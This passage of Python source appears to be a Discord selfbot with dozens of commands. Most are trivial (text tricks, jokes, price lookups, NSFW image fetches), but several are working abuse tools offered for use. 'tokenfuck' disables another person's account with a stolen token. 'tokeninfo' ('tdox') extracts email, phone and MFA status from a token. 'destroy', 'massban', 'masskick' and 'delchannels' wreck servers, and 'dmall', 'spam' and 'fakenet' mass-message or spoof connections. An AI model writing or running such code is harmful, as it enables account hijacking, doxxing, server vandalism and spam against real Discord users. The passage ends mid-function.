async def _1337_speak(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    text = text.replace('a', '4').replace('A', '4').replace('e', '3')\
            .replace('E', '3').replace('i', '!').replace('I', '!')\
            .replace('o', '0').replace('O', '0').replace('u', '|_|').replace('U', '|_|')
    await ctx.send(f'`{text}`')

@stselfbot.command(aliases=['dvwl'])
async def devowel(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    dvl = text.replace('a', '').replace('A', '').replace('e', '')\
            .replace('E', '').replace('i', '').replace('I', '')\
            .replace('o', '').replace('O', '').replace('u', '').replace('U', '')
    await ctx.send(dvl)

@stselfbot.command()
async def blank(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Blank]'''+Fore.RESET)
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:  
        password = config.get('password')
        with open('Images/Avatars/Transparent.png', 'rb') as f:
          try:      
             await stselfbot.user.edit(password=password, username="ٴٴٴٴ", avatar=f.read())
          except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@stselfbot.command(aliases=['pfpget', 'stealpfp'])
async def pfpsteal(ctx, user: discord.User): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Pfpsteal]'''+Fore.RESET)
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/Stolen/Stolen.png', 'wb') as f:
          r = requests.get(user.avatar_url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
        try:
            Image.open('Images/Avatars/Stolen/Stolen.png').convert('RGB')
            with open('Images/Avatars/Stolen/Stolen.png', 'rb') as f:
              await stselfbot.user.edit(password=password, avatar=f.read())
        except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@stselfbot.command(name='set-pfp', aliases=['setpfp', 'pfpset'])
async def _set_pfp(ctx, *, url): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Setpfp]'''+Fore.RESET)
    if config.get('password') == 'password-here':
        print(f"{Fore.RED}[ERROR] {Fore.YELLOW}You didnt put your password in the config.json file"+Fore.RESET)
    else:
        password = config.get('password')
        with open('Images/Avatars/PFP-1.png', 'wb') as f:
          r = requests.get(url, stream=True)
          for block in r.iter_content(1024):
              if not block:
                  break
              f.write(block)
    try:
        Image.open('Images/Avatars/PFP-1.png'   ).convert('RGB')
        with open('Images/Avatars/PFP-1.png', 'rb') as f:
            await stselfbot.user.edit(password=password, avatar=f.read())
    except discord.HTTPException as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@stselfbot.command(aliases=['dong', 'penis'])
async def dick(ctx, *, user: discord.User = None): # b'\xfc'
    await ctx.message.delete()
    if user is None:
        user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

@stselfbot.command(aliases=['changehypesquad'])
async def hypesquad(ctx, house): # b'\xfc'
    await ctx.message.delete()
    request = requests.Session()
    headers = {
      'Authorization': token,
      'Content-Type': 'application/json',
      'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) discord/0.0.305 Chrome/69.0.3497.128 Electron/4.0.8 Safari/537.36'
    }    
    if house == "bravery":
      payload = {'house_id': 1}
    elif house == "brilliance":
      payload = {'house_id': 2}
    elif house == "balance":
      payload = {'house_id': 3}
    elif house == "random":
        houses = [1, 2, 3]
        payload = {'house_id': random.choice(houses)}
    try:
        request.post('https://discordapp.com/api/v6/hypesquad/online', headers=headers, json=payload, timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@stselfbot.command(aliases=['tokenfucker', 'disable', 'crash']) 
async def tokenfuck(ctx, _token): # b'\xfc' 
    await ctx.message.delete()
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US; rv:1.7.12) Gecko/20050915 Firefox/1.0.7',
        'Content-Type': 'application/json',
        'Authorization': _token,
    }
    request = requests.Session()
    payload = {
        'theme': "light",
        'locale': "ja",
        'message_display_compact': False,
        'inline_embed_media': False,
        'inline_attachment_media': False,
        'gif_auto_play': False,
        'render_embeds': False,
        'render_reactions': False,
        'animate_emoji': False,
        'convert_emoticons': False,
        'enable_tts_command': False,
        'explicit_content_filter': '0',
        'status': "invisible"
    }
    guild = {
        'channels': None,
        'icon': None,
        'name': "ALUCARD",
        'region': "europe"
    } 
    for _i in range(50):
        requests.post('https://discordapp.com/api/v6/guilds', headers=headers, json=guild)
    while True:
        try:
            request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=payload)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
        else:
            break
    modes = cycle(["light", "dark"])
    statuses = cycle(["online", "idle", "dnd", "invisible"])
    while True:
        setting = {
            'theme': next(modes),
            'locale': random.choice(locales),
            'status': next(statuses)
        }
        while True:
            try:
                request.patch("https://canary.discordapp.com/api/v6/users/@me/settings",headers=headers, json=setting, timeout=10)
            except Exception as e:
                print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)
            else:
                break   

@stselfbot.command()
async def masslogin(ctx, choice = None): # b'\xfc'
    await ctx.message.delete()
    _masslogin(choice)

@stselfbot.command()
async def masscon(ctx, _type, amount: int, *, name=None): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Masscon]'''+Fore.RESET)
    payload = {
        'name': name,
        'visibility': 1 
    }
    headers = {
        'Authorization': token,
        'Content-Type':'application/json', 
    }
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        print(f'Avaliable connections: {avaliable}')
    for _i in range(amount):
        try:
            ID = random.randint(10000000, 90000000)
            time.sleep(5) 
            r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
            if r.status_code == 200:
                print(f"[{Fore.GREEN}+{Fore.RESET}] New connection added!")
            else:
                print(f"[{Fore.RED}-{Fore.RESET}] Couldnt add connection!");break
        except (Exception, ValueError) as e:
            print(e);break
    print(f"[{Fore.GREEN}+{Fore.RESET}] Finished adding connections!")

@stselfbot.command(aliases=['fakeconnection', 'spoofconnection'])
async def fakenet(ctx, _type, *, name = None): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Fakenet]'''+Fore.RESET)
    ID  = random.randrange(10000000, 90000000)
    avaliable = [
        'battlenet',
        'skype',
        'leagueoflegends'
    ]
    payload = {
        'name': name,
        'visibility': 1
    }
    headers = {
        'Authorization': token,
        'Content-Type':'application/json', 
    }
    if name is None:
        name = 'about:blank'
    elif _type not in avaliable:
        await ctx.send(f'Avaliable connections: `{avaliable}`', delete_after = 3)
    r = requests.put(f'https://canary.discordapp.com/api/v6/users/@me/connections/{_type}/{ID}', data=json.dumps(payload), headers=headers)
    if r.status_code == 200:            
        await ctx.send(f"Added connection: `{type}` with Username: `{name}` and ID: `{ID}`", delete_after = 3)
    else:
        await ctx.send('Some error has happened with the endpoint', delete_after = 3)

@stselfbot.command(aliases=['tokinfo', 'tdox'])
async def tokeninfo(ctx, _token): # b'\xfc'
    await ctx.message.delete()
    headers = {
        'Authorization': _token,
        'Content-Type': 'application/json'
    }      
    try:
        res = requests.get('https://canary.discordapp.com/api/v6/users/@me', headers=headers)
        res = res.json()
        user_id = res['id']
        locale = res['locale']
        avatar_id = res['avatar']
        language = languages.get(locale)
        creation_date = datetime.datetime.utcfromtimestamp(((int(user_id) >> 22) + 1420070400000) / 1000).strftime('%d-%m-%Y %H:%M:%S UTC') 
    except KeyError:
        print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}Invalid token"+Fore.RESET)
    em = discord.Embed(
        description=f"Name: `{res['username']}#{res['discriminator']}`\nID: `{res['id']}`\nEmail: `{res['email']}`\nCreation Date: `{creation_date}`\nProfile picture: [**Click here**](https://cdn.discordapp.com/avatars/{user_id}/{avatar_id})")
    fields = [
        {'name': 'Phone', 'value': res['phone']},
        {'name': 'Flags', 'value': res['flags']},
        {'name': 'Local language', 'value': res['locale'] + f"{language}"},
        {'name': 'MFA?', 'value': res['mfa_enabled']},
        {'name': 'Verified?', 'value': res['verified']},
    ]
    for field in fields:
        if field['value']:
            em.add_field(name=field['name'], value=field['value'], inline=False)
            em.set_thumbnail(url=f"https://cdn.discordapp.com/avatars/{user_id}/{avatar_id}")
    return await ctx.send(embed=em)

@stselfbot.command()
async def copy(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Copy]'''+Fore.RESET)
    await stselfbot.create_guild(f'backup-{ctx.guild.name}')
    await asyncio.sleep(4)
    for g in stselfbot.guilds:
        if f'backup-{ctx.guild.name}' in g.name:
            for c in g.channels:
                await c.delete()
            for cate in ctx.guild.categories:
                x = await g.create_category(f"{cate.name}")
                for chann in cate.channels:
                    if isinstance(chann, discord.VoiceChannel):
                        await x.create_voice_channel(f"{chann}")
                    if isinstance(chann, discord.TextChannel):
                        await x.create_text_channel(f"{chann}")
    try:                
        await g.edit(icon=ctx.guild.icon_url)
    except:
        pass

@stselfbot.command()
async def destroy(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Destroy]'''+Fore.RESET)
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()    
        except:
            pass
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass
    try:
        await ctx.guild.edit(
            name=RandString(),
            description="hi",
            reason="hi",
            icon=None,
            banner=None
        )  
    except:
        pass        
    for _i in range(250):
        await ctx.guild.create_text_channel(name=RandString())
    for _i in range(250):
        await ctx.guild.create_role(name=RandString(), color=RandomColor())

@stselfbot.command()
async def dmall(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Dmall]'''+Fore.RESET)
    for user in list(ctx.guild.members):
        try:
            await asyncio.sleep(5)    
            await user.send(message)
        except:
            pass

@stselfbot.command()
async def massban(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Massban]'''+Fore.RESET)
    for user in list(ctx.guild.members):
        try:
            await user.ban()
        except:
            pass    

@stselfbot.command()
async def masskick(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Masskick]'''+Fore.RESET)
    for user in list(ctx.guild.members):
        try:
            await user.kick()
        except:
            pass    

@stselfbot.command()
async def massrole(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Massrole]'''+Fore.RESET)
    for _i in range(250):
        try:
            await ctx.guild.create_role(name=RandString(), color=RandomColor())
        except:
            return    

@stselfbot.command()
async def masschannel(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Masschann]'''+Fore.RESET)
    for _i in range(250):
        try:
            await ctx.guild.create_text_channel(name=RandString())
        except:
            return

@stselfbot.command()
async def delchannels(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Delchann]'''+Fore.RESET)
    for channel in list(ctx.guild.channels):
        try:
            await channel.delete()
        except:
            return

@stselfbot.command() 
async def delroles(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Delroles]'''+Fore.RESET)
    for role in list(ctx.guild.roles):
        try:
            await role.delete()
        except:
            pass

@stselfbot.command()
async def massunban(ctx): # b'\xfc'
    await ctx.message.delete()    
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Massunban]'''+Fore.RESET)
    banlist = await ctx.guild.bans()
    for users in banlist:
        try:
            await asyncio.sleep(2)
            await ctx.guild.unban(user=users.user)
        except:
            pass

@stselfbot.command()
async def spam(ctx, amount: int, *, message): # b'\xfc'
    await ctx.message.delete()    
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Spam]'''+Fore.RESET)
    for _i in range(amount):
        await ctx.send(message)

@stselfbot.command()
async def dm(ctx, user : discord.User, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Dm]'''+Fore.RESET)
    user = stselfbot.get_user(user.id)
    if ctx.author.id == stselfbot.user.id:
        return
    else:
        try:
            await user.send(message) 
        except:
            pass       

@stselfbot.command(name='get-color', aliases=['color', 'colour', 'sc'])
async def _get_color(ctx, *, color: discord.Colour): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Getcolor]'''+Fore.RESET)
    file = io.BytesIO()
    Image.new('RGB', (200, 90), color.to_rgb()).save(file, format='PNG')
    file.seek(0)
    em = discord.Embed(color=color, title=f'Showing Color: {str(color)}')
    em.set_image(url='attachment://color.png')
    await ctx.send(file=discord.File(file, 'color.png'), embed=em) 

@stselfbot.command()
async def tinyurl(ctx, *, link): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Tinyurl]'''+Fore.RESET)
    r = requests.get(f'http://tinyurl.com/api-create.php?url={link}').text
    em = discord.Embed()
    em.add_field(name='Shortened link', value=r, inline=False )
    await ctx.send(embed=em)

@stselfbot.command(aliases=['rainbow-role'])
async def rainbow(ctx, *, role): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Rainbow]'''+Fore.RESET)
    role = discord.utils.get(ctx.guild.roles, name=role)
    while True:
        try:
            await role.edit(role=role, colour=RandomColor())
            await asyncio.sleep(10)
        except:
            break

@stselfbot.command(name='8ball')
async def _ball(ctx, *, question): # b'\xfc'
    await ctx.message.delete()
    responses = [
      'That is a resounding no',
      'It is not looking likely',
      'Too hard to tell',
      'It is quite possible',
      'That is a definite yes!',
      'Maybe',
      'There is a good chance'
    ]
    answer = random.choice(responses)
    embed = discord.Embed()
    embed.add_field(name="Question", value=question, inline=False)
    embed.add_field(name="Answer", value=answer, inline=False)
    embed.set_thumbnail(url="https://www.horoscope.com/images-US/games/game-magic-8-ball-no-text.png")
    embed.set_footer(text=datetime.datetime.now())
    await ctx.send(embed=embed)

@stselfbot.command(aliases=['slots', 'bet'])
async def slot(ctx): # b'\xfc'
    await ctx.message.delete()
    emojis = "🍎🍊🍐🍋🍉🍇🍓🍒"
    a = random.choice(emojis)
    b = random.choice(emojis)
    c = random.choice(emojis)
    slotmachine = f"**[ {a} {b} {c} ]\n{ctx.author.name}**,"
    if (a == b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} All matchings, you won!"}))
    elif (a == b) or (a == c) or (b == c):
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} 2 in a row, you won!"}))
    else:
        await ctx.send(embed=discord.Embed.from_dict({"title":"Slot machine", "description":f"{slotmachine} No match, you lost"}))

@stselfbot.command()
async def joke(ctx):  # b'\xfc'
    await ctx.message.delete()
    headers = {
        "Accept": "application/json"
    }
    async with aiohttp.ClientSession()as session:
        async with session.get("https://icanhazdadjoke.com", headers=headers) as req:
            r = await req.json()
    await ctx.send(r["joke"])

@stselfbot.command(name='auto-bump', aliases=['bump'])
async def _auto_bump(ctx, channelid): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Autobump]'''+Fore.RESET)
    count = 0
    while True:
        try:
            count += 1 
            channel = stselfbot.get_channel(int(channelid))
            await channel.send('!d bump')           
            print(f'{Fore.BLUE}[AUTO-BUMP] {Fore.GREEN}Bump number: {count} sent'+Fore.RESET)
            await asyncio.sleep(7200)
        except Exception as e:
            print(f"{Fore.RED}[ERROR]: {Fore.YELLOW}{e}"+Fore.RESET)

@stselfbot.command()
async def tts(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    buff = await do_tts(message)
    await ctx.send(file=discord.File(buff, f"{message}.wav"))

@stselfbot.command()
async def upper(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    message = message.upper()
    await ctx.send(message)

@stselfbot.command(aliases=['guildpfp'])
async def guildicon(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Guildicon]'''+Fore.RESET)
    em = discord.Embed(title=ctx.guild.name)
    em.set_image(url=ctx.guild.icon_url)
    await ctx.send(embed=em)

@stselfbot.command(name='backup-f', aliases=['friendbackup', 'friend-backup', 'backup-friends', 'backupf'])
async def _backup_f(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Backup]'''+Fore.RESET)
    for friend in stselfbot.user.friends:
       friendlist = (friend.name)+'#'+(friend.discriminator)   
       with open('Backup/Friends.txt', 'a+') as f:
           f.write(friendlist+"\n" )
    for block in stselfbot.user.blocked:
        blocklist = (block.name)+'#'+(block.discriminator)
        with open('Backup/Blocked.txt', 'a+') as f: 
            f.write(blocklist+"\n" )

@stselfbot.command(name='first-message', aliases=['firstmsg', 'fm', 'firstmessage'])
async def _first_message(ctx, channel: discord.TextChannel = None): # b'\xfc'
    await ctx.message.delete()  
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Firstmesg]'''+Fore.RESET)
    if channel is None:
        channel = ctx.channel
    first_message = (await channel.history(limit=1, oldest_first=True).flatten())[0]
    embed = discord.Embed(description=first_message.content)
    embed.add_field(name="First Message", value=f"[Jump]({first_message.jump_url})")
    await ctx.send(embed=embed)

@stselfbot.command()
async def mac(ctx, mac): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Mac]'''+Fore.RESET)
    r = requests.get('http://api.macvendors.com/' + mac)
    em = discord.Embed(title='MAC Lookup Result sts cool selfbot', description=r.text, colour=0xDEADBF)
    em.set_author(name='MAC Finder', icon_url='https://regmedia.co.uk/2016/09/22/wifi_icon_shutterstock.jpg?x=1200&y=794')
    await ctx.send(embed=em)
    
@stselfbot.command()
async def pp(ctx, *, user: discord.User = None):
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [PP]'''+Fore.RESET)
    if user is None: user = ctx.author
    size = random.randint(1, 15)
    dong = ""
    for _i in range(0, size):
        dong += "="
    em = discord.Embed(title=f"{user}'s Dick size", description=f"8{dong}D", colour=0x0000)
    await ctx.send(embed=em)

@stselfbot.command()
async def abc(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Abc]'''+Fore.RESET)
    ABC = ['a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'ñ', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z']
    message = await ctx.send(ABC[0])
    await asyncio.sleep(2)
    for _next in ABC[1:]:
        await message.edit(content=_next)
        await asyncio.sleep(2)

@stselfbot.command(aliases=['bitcoin'])
async def btc(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Btc]'''+Fore.RESET)
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=BTC&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Bitcoin', icon_url='https://cdn.pixabay.com/photo/2013/12/08/12/12/bitcoin-225079_960_720.png')
    await ctx.send(embed=em)

@stselfbot.command(aliases=['ethereum'])
async def eth(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Eth]'''+Fore.RESET)
    r = requests.get('https://min-api.cryptocompare.com/data/price?fsym=ETH&tsyms=USD,EUR')
    r = r.json()
    usd = r['USD']
    eur = r['EUR']
    em = discord.Embed(description=f'USD: `{str(usd)}$`\nEUR: `{str(eur)}€`')
    em.set_author(name='Ethereum', icon_url='https://cdn.discordapp.com/attachments/271256875205525504/374282740218200064/2000px-Ethereum_logo.png')
    await ctx.send(embed=em)

@stselfbot.command()
async def topic(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Topic]'''+Fore.RESET)
    r = requests.get('https://www.conversationstarters.com/generator.php').content
    soup = bs4(r, 'html.parser')
    topic = soup.find(id="random").text
    await ctx.send(topic)

@stselfbot.command(aliases=['wouldyourather', 'would-you-rather', 'wyrq'])
async def wyr(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Wyr]'''+Fore.RESET)
    r = requests.get('https://www.conversationstarters.com/wyrqlist.php').text
    soup = bs4(r, 'html.parser')
    qa = soup.find(id='qa').text
    qor = soup.find(id='qor').text
    qb = soup.find(id='qb').text
    em = discord.Embed(description=f'{qa}\n{qor}\n{qb}')
    await ctx.send(embed=em)

@stselfbot.command()
async def hastebin(ctx, *, message): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Hastebin]'''+Fore.RESET)
    r = requests.post("https://hastebin.com/documents", data=message).json()
    await ctx.send(f"<https://hastebin.com/{r['key']}>")

@stselfbot.command()
async def ascii(ctx, *, text): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Ascii]'''+Fore.RESET)
    r = requests.get(f'http://artii.herokuapp.com/make?text={urllib.parse.quote_plus(text)}').text
    if len('```'+r+'```') > 2000:
        return
    await ctx.send(f"```{r}```")

@stselfbot.command()
async def anal(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Anal]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/anal")
    res = r.json()
    em = discord.Embed()   
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@stselfbot.command()
async def erofeet(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Erofeet]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/erofeet")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def feet(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Feet]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/feetg")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def hentai(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Hentai]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/Random_hentai_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@stselfbot.command()
async def boobs(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Boobs]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/boobs")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def tits(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Tits]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/tits")
    res = r.json()
    em = discord.Embed()    
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def blowjob(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Blowjob]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/blowjob")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def lewdneko(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Lewdneko]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/nsfw_neko_gif")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)   

@stselfbot.command()
async def lesbian(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Lesbian]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/les")
    res = r.json()
    em = discord.Embed()
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()  
async def feed(ctx, user: discord.User): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Feed]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/feed")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def tickle(ctx, user: discord.User): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Tickle]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/tickle")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def slap(ctx, user: discord.User): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Slap]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/slap")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def hug(ctx, user: discord.User): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Hug]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/hug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def smug(ctx, user: discord.User): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Smug]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/smug")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def pat(ctx, user: discord.User): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Pat]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/pat")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command()
async def kiss(ctx, user: discord.User): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Kiss]'''+Fore.RESET)
    r = requests.get("https://nekos.life/api/v2/img/kiss")
    res = r.json()
    em = discord.Embed(description=user.mention)
    em.set_image(url=res['url'])
    await ctx.send(embed=em)

@stselfbot.command(aliases=['proxy'])
async def proxies(ctx): # b'\xfc'
    await ctx.message.delete()
    print(f'''{Fore.BLUE}[LOG] {Fore.WHITE}Command ran [Proxies]'''+Fore.RESET)
    file = open("Data/Http-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=http&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Https-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=https&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
             proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks4-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks4&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
    for p in proxies:
        file.write((p)+"\n")
    file = open("Data/Socks5-proxies.txt", "a+")
    res = requests.get('https://api.proxyscrape.com/?request=displayproxies&proxytype=socks5&timeout=1500')
    proxies = []
    for proxy in res.text.split('\n'):
        proxy = proxy.strip()
        if proxy:
            proxies.append(proxy)
